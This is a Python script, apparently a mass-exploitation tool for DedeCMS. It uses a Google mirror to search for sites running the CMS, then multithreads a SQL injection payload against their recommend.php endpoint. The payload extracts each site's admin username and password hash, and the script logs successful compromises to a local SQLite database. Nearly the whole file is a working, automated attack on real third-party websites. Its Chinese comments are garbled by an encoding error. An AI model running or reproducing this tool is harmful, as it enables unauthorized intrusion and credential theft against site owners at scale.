#!usr/bin/env python
#encoding:gbk
#version:0.9
#author:TinyMin
#email:1072571473@qq.com

import re
import requests
import sqlite3
import urllib
import threading

"""
��������֯�� dedecms recommand.php ��ע��©���Զ������ù��ߡ�
1��ʹ��google����������©����վ��˾�����ܹ���ʱ��Ͳ������ˣ���ʱ��ֻҪ�����޸ġ�ʹ��google����ץȡ��������Ϣ�������ˡ�
2��������Щ�߽�����û�п��ǣ�����google����ҳ��û�����ޣ����̲߳�ͣ�Ľ���selectû�п��ǵ����ݿ��¼Ϊ�յ�����ȣ�
3������python��GIL������python��֧����Ķ��̣߳����������򲢲��Ǽ����ܼ��ͳ���������Ҳû��ϵ��������û��Ƕ����+Э�̡�
"""
####################################################################################################
#������ʹ��google����ץȡ��������Ϣ
GOOGLE_MIRROR   = 'https://g.chenjx.cn/'
GOOGLE_PREFIX   ='search?q='
GOOGLE_SUFFIX   ='&start='
GOOGLE_KEYWORDS = 'intext:Powered by DedeCMS'
URL = "%s%s%s%s" % (GOOGLE_MIRROR, GOOGLE_PREFIX, urllib.quote(GOOGLE_KEYWORDS), GOOGLE_SUFFIX)
HEAD = {
    'Host': 'g.chenjx.cn',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'DNT': '1',
    'Referer': 'https://g.chenjx.cn/',
    'Connection': 'keep-alive',
}

#exp
EXP_STRING = """/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"""

#�߳�����python��֧������̣߳�������������Ǽ����ܼ��Ͳ���Ҫ���cpu���ٶ��߳�Ҳ�ǿ������Ч�ʵ�??��������õĻ��Ƕ���̼�Э�̣�
THREAD_NUMBER = 10

#Ԥ����ץȡ����ҳ�����������д
FIX = (
    ('<b>', ''),
    ('</b>', ''),
    ('<cite class="_Rm bc">', '<cite class="_Rm">')
)

#�Ӵ�����ҳ����ץȡ��ҳ����
match     = re.compile(r'<cite class="_Rm">(([0-9a-zA-Z\-_]+?\.)+\w+)/?')

#ץȡ����Ա�û�������
match_pwn = re.compile(r'\|(.+?\|[a-z0-9]+)</h2>')

#goole����ʱ��ָ��google�����ĵڼ�ҳ��һ��+10 ��0��ʼ��
page = 0

#���Ӷ���
conn =False

#�α����
cursor = False

google = requests.get

#�߳���
lock = threading.Lock()

#ò��sqlite��֧�ֶ��̹߳���conn/cursor�����ԼӸ���
def syn_execute(sql):
    global conn
    global cursor
    global lock
    lock.acquire()
    try:
        _ = conn.execute(sql)
        conn.commit()
        return _
        #return cursor.execute(sql)
    finally:
        lock.release()

#�߳���ִ�еĴ���
def exp(conn):
    _ = ''
    while True:
        _ = syn_execute("SELECT URL FROM dedecms_recommand where CHECKED = 0 LIMIT 0,1").fetchall()[0][0]
        syn_execute("UPDATE dedecms_recommand set CHECKED = 1 where URL = '%s'"%_)
        #print threading.currentThread(), _
        try:
            result = google('http://%s%s'% (_, EXP_STRING) ).content
            tmp = match_pwn.findall(result)
            if len(tmp)>0:
                print threading.currentThread(), tmp[0]
                syn_execute("UPDATE dedecms_recommand SET PWN = '%s' WHERE URL = '%s'" % (tmp[0], _))
        except:
            try:
                result = google('https://%s%s'% (_, EXP_STRING) ).content
                tmp = match_pwn.findall(result)
                if len(tmp)>0:
                    print threading.currentThread(), tmp[0]
                    syn_execute("UPDATE dedecms_recommand SET PWN = '%s' WHERE URL = '%s'" % (tmp[0], _))
            except:
                print threading.currentThread(), "can't get ", _


def main():
    # ��ʼ�����ݿ�
    global page
    global conn
    global cursor
    try:
        conn = sqlite3.connect("dedecms_recommand.db", check_same_thread = False)
        conn.execute("""
          CREATE TABLE IF NOT EXISTS dedecms_recommand(
          URL TEXT,
          CHECKED INTEGER,
          PWN TEXT);""")
        conn.commit()
        cursor = conn.cursor()
    except:
        print "can't connect to table"
    #�����߳�������©����֤
    for i in range(THREAD_NUMBER):
        checker = threading.Thread(target=exp, name='exp_%d'%i, args = (cursor,))
        checker.start()

    #���߳�������ͣ��Ѱ�ҿ���Ŀ��
    while True:
        url = "%s%d" % (URL, page)
        try:
            result = google(url,headers=HEAD).content
            for i in FIX:
                result = result.replace(i[0], i[1])
        except:
            print "can't google!", url
        page += 10
        #print zip(*match.findall(result))
        tmp = match.findall(result)
        if len(tmp)<1: continue
        for i in zip(*tmp)[0]:
            sql = r"SELECT * FROM dedecms_recommand WHERE URL = '%s'" % i
            x=syn_execute(sql).fetchall()
            if len(x) <1:
                syn_execute("INSERT INTO dedecms_recommand(URL, CHECKED, PWN) VALUES('%s', 0, '')"%(i))



if __name__=='__main__':
    main()